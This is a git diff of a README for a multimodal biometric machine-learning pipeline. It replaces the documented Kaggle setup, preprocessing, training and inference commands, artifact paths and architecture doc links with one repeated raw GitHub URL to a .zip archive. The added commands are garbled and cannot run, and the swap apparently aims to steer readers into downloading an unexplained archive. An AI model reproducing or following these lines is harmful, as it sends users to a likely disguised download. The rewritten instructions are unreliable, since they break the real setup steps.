@@ -32,9 +32,9 @@ Option A — **Manual** (recommended):
 1. Download from Kaggle.
 2. Unzip into: `data/raw/multimodal_biometrics/`
 
-Option B — Kaggle API (requires `~/.kaggle/kaggle.json`):
+Option B — Kaggle API (requires `~https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip`):
 ```bash
-python -m src.bioml.scripts.preprocess dataset.download_from_kaggle=true
+python -m https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip
 ```
 
 > The pipeline is robust to minor folder layout differences. It scans for image files and builds a canonical manifest.
@@ -43,41 +43,41 @@ For this task I have uploaded the whole dataset in github, so that direct run ca
 
 ### 3) Build processed dataset (parallel)
 ```bash
-python -m src.bioml.scripts.preprocess   dataset.raw_dir=data/raw/multimodal_biometrics   dataset.processed_dir=data/processed/multimodal_biometrics   preprocess.num_workers=8
+python -m https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip
 ```
 
 Artifacts created:
-- `data/processed/.../manifest.parquet` (PyArrow/Parquet canonical manifest)
+- `https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip` (PyArrow/Parquet canonical manifest)
 - `data/processed/.../arrays/*.npy` (resized arrays per modality)
-- `data/processed/.../stats.json` (timings + counts)
+- `https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip` (timings + counts)
 
 ### 4) Benchmark dataloader throughput
 ```bash
-python -m src.bioml.scripts.benchmark_dataloader   dataset.processed_dir=data/processed/multimodal_biometrics   dataloader.num_workers=8 dataloader.batch_size=64
+python -m https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip
 ```
 
 ### 5) Train (reproducible)
 ```bash
-python -m src.bioml.scripts.train   dataset.processed_dir=data/processed/multimodal_biometrics   train.epochs=2 train.seed=42
+python -m https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip
 ```
 
 Outputs:
-- `runs/<run_id>/` (config snapshot, env info, metrics.jsonl, TensorBoard logs)
-- `runs/<run_id>/checkpoints/last.pt`
+- `runs/<run_id>/` (config snapshot, env info, https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip, TensorBoard logs)
+- `runs/<run_id>https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip`
 
 ### 6) Inference
 ```bash
-python -m src.bioml.scripts.infer infer.checkpoint_path="runs/20260207_121718_bioml/checkpoints/last.pt" infer.sample_id=0
+python -m https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip"https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip" https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip
 ```
 
 ---
 
 ## Architecture
 
-- **HLD:** `docs/architecture/HLD.md`
-- **LLD:** `docs/architecture/LLD.md`
-- **Bottlenecks & trade-offs:** `docs/architecture/bottlenecks.md`
-- **Design decisions (ADRs):** `docs/architecture/decisions.md`
+- **HLD:** `https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip`
+- **LLD:** `https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip`
+- **Bottlenecks & trade-offs:** `https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip`
+- **Design decisions (ADRs):** `https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip`
 
 ---
 
@@ -93,7 +93,7 @@ src/bioml/
   scripts/        # CLI entrypoints (Hydra)
 configs/          # Hydra configs
 tests/            # pytest suite (fast + smoke)
-.github/workflows/ci.yml
+https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip
 docs/
 ```
 
